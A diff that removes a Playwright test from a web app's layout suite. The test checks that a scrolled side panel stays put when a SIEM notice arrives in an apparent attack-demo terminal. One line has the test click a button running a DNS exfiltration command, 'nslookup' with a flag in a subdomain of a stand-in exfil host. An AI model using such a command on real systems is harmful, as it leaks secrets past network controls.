@@ -474,30 +474,6 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
   });
   }
 
-  test("a side panel scrolled down stays put when a notice lands; a 'New notice ↑' chip offers the way up", async ({ page, isMobile }) => {
-    test.skip(isMobile, "the side panel is a wide-screen layout");
-    test.setTimeout(60_000);
-    await page.setViewportSize({ width: 1440, height: 600 });
-    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=30000");
-    const term = page.locator("#terminal");
-    await term.getByRole("button", { name: /Open the terminal/ }).click();
-    await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
-    await term.getByRole("button", { name: "nslookup sdp-<flag>.x.exfil.sdp.test." }).click();
-    const panel = page.locator("#tour .tour");
-    // The visitor scrolls the panel down (it overflows a 600 px screen).
-    await expect.poll(() => panel.evaluate((el) => el.scrollHeight > el.clientHeight)).toBe(true);
-    await panel.evaluate((el) => (el.scrollTop = 120));
-    const before = await panel.evaluate((el) => el.scrollTop);
-    expect(before).toBeGreaterThan(0);
-    await expect(page.locator("#tour-steps .tour__notice--siem")).toHaveCount(1, { timeout: 25_000 });
-    await page.waitForTimeout(300);
-    expect(await panel.evaluate((el) => el.scrollTop)).toBe(before);
-    const chip = panel.getByRole("button", { name: "New notice ↑" });
-    await expect(chip).toBeVisible();
-    await chip.click();
-    await expect.poll(() => panel.evaluate((el) => el.scrollTop)).toBe(0);
-    await expect(chip).toBeHidden();
-  });
 
   test("the About bar: the first About sentence verbatim, then the automation line on its own line", async ({ page }) => {
     await page.goto("/?mock=1");
